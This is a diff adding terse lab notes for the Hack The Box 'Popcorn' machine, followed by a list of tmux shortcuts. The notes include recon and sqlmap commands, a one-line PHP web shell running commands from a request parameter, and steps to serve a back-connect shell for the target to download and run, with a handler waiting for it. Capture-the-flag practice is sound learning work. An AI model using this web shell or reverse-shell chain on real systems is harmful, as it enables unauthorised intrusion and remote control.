@@ -1,0 +1,35 @@
+openvpn htb.ovpn
+mkdir <HOSTNAME> && cd <HOSTNAME>
+popcorn="10.10.10.6"
+nmap -sC -sV -oA nmap $popcorn
+Firefox -> Install Foxy Proxy
+java -jar -Xmx4g /opt/BurpSuitePro/burpsuite_pro.jar
+#configure localhost:8080 for burp suite
+Burp -> Proxy -> Intercept
+#set host header to domain for potential virtual host routing
+#https://portswigger.net/web-security #web security academy
+dirb http://$popcorn -r -o popcorn.dirb
+searchsploit "torrent hoster"
+searchsploit -x 11746.txt
+###Pending Firefox -> Install Tamper Data
+sqlmap -r login.req --level 5 --risk 3
+mkdir /opt/shells
+git clone https://github.com/infodox/python-pty-shells.git
+cmd.php <?php echo system($_REQUEST['ipp']); ?>
+python -m SimpleHTTPServer #wget tcp_pty_backconnect.py, cat then python *.py
+python tcp_pty_shell_handler.py -b 10.10.12.194.31337
+
+
+
+tmux keyboard shortcuts:
+------------------------
+    ^b then c to create a new window
+    ^b then n to switch to the next window
+    ^b then , then [type something] then ⌤ to rename the current window
+    ^b then % to split the current window into panes vertically
+    ^b then " to split the current window into panes horizontally
+    ^b then ↑ to move to the above pane (works for all four arrows)
+    ^b then q to show pane numbers, then (optionally) the number to switch to that pane
+    ^b then ⎇↑ to resize the current pane up (works for all four arrows)
+    ^b then x to kill the current pane (or window if it only has one pane)
+    ^b then [ to enter copy mode, then four arrow keys to move, even past the visible point, which is great for scrolling--I don't use it much for copying/pasting.
